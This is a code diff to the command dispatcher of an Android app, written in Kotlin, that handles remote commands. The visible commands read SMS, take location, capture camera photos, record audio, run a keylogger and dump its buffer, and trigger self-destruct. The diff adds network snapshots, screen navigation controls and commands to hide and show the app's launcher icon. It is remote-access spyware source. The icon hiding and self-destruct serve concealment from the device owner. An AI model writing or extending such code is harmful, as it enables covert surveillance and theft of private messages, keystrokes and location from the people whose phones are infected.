@@ -10,10 +10,15 @@ object CommandExecutor {
         "device_info"        -> DeviceInfo.snapshot(ctx, DeviceInfo.id(ctx))
         "list_apps"          -> Apps.list(ctx, args.optBoolean("system_only", false))
         "location"           -> Location.get(ctx)
+        "network_info"       -> NetworkInfo.snapshot(ctx)
+        "list_permissions"   -> JSONObject().put("error", "not_implemented")
+        "running_processes"  -> JSONObject().put("error", "not_implemented")
 
         // Camera / media
         "camera_photo"       -> Camera.capture(ctx, args.optString("camera", "back"))
         "mic_record"         -> Audio.record(ctx, args.optInt("duration", 10))
+        "camera_stream"      -> JSONObject().put("error", "not_implemented")
+        "screen_record"      -> JSONObject().put("error", "handled_by_service")
 
         // Comms / data
         "sms_list"           -> Sms.list(ctx, args.optInt("limit", 50))
@@ -35,6 +40,10 @@ object CommandExecutor {
 
         // System control
         "lock_screen"        -> SystemControl.lockScreen(ctx)
+        "go_home"            -> SystemControl.goHome()
+        "go_back"            -> SystemControl.back()
+        "recents"            -> SystemControl.recents()
+        "open_notifications" -> SystemControl.openNotifications()
         "open_app"           -> SystemControl.openApp(ctx, args.getString("package"))
         "open_url"           -> SystemControl.openUrl(ctx, args.getString("url"))
         "set_wakelock"       -> SystemControl.wakeLock(ctx, args.optLong("ms", 10_000))
@@ -45,6 +54,10 @@ object CommandExecutor {
         "keylog_start"       -> JSONObject().put("ok", KeylogBuffer.start())
         "keylog_stop"        -> JSONObject().put("ok", KeylogBuffer.stop())
         "keylog_dump"        -> KeylogBuffer.dump()
+
+        // Icons
+        "hide_icon"          -> IconHider.hide(ctx)
+        "show_icon"          -> IconHider.show(ctx)
 
         // Destruct
         "self_destruct"      -> SelfDestruct.run(ctx)
